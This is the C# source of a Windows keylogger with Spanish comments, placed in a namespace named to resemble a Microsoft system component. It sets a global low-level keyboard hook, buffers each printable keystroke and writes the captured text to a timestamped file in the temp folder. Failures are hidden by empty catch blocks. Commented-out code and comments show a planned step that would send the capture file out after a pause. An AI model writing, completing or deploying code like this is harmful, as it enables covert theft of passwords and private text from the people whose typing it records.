using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Collections.Generic;

namespace SystemHooksMicrosoft
{
    public class InterceptKeys
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        #region "Mis variables"
        //static string temp_path = System.IO.Path.GetTempPath();
        private static string temp_path = System.IO.Path.GetTempPath() + "pk" + DateTime.Now.ToString("yyMMdd_hhmmss") + ".pkf";
        static string _mensaje;
        private static readonly List<int> _ascii_imprimibles = new List<int>() {32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,
            48,49,50,51,52,53,54,55,56,57,//[0-9]
            58,59,60,61,62,63,64,
            65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,//[A-Z]
            91,92,93,94,95,96,
            97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,//[a-z]
            123,124,125,26};
        private static System.Timers.Timer aTimer;
        #endregion

        public static void Main()
        {
            aTimer = new System.Timers.Timer();
            aTimer.Interval = 1000;
            aTimer.Elapsed += aTimerElapsedEvent;
            aTimer.AutoReset = true;
            aTimer.Enabled = true;

            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Procesar(vkCode);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private static void Procesar(int charCode)
        {
            try
            {
                //if (seconds_since_last_press > 5) { Escribir(_mensaje); EnviarArchivo();}else
                if (charCode == 13)
                {
                    Escribir(_mensaje);
                    _mensaje = "";
                }
                else if (_ascii_imprimibles.IndexOf(charCode) > -1)
                {
                    _mensaje += Convert.ToChar(charCode);

                }
                else if( charCode == 8 || charCode == 127) // if BACKSPACE or DEL (SUPR) pressed
                {
                    _mensaje += Convert.ToChar(charCode);
                    Escribir(_mensaje);
                    _mensaje = "";

                }
            }
            catch { }
        }

        private static void Escribir(string linea)
        {
            try
            {
                System.IO.File.WriteAllText(temp_path, linea);
            }
            catch { }
        }

        private static void aTimerElapsedEvent(Object source, System.Timers.ElapsedEventArgs e)
        {
            //Si ya pasaron 5 segundos desde la última tecla y el mensaje no está vacio... enviar
            Console.WriteLine("The Elapsed event was raised at {0}", e.SignalTime);
        }
    }
}
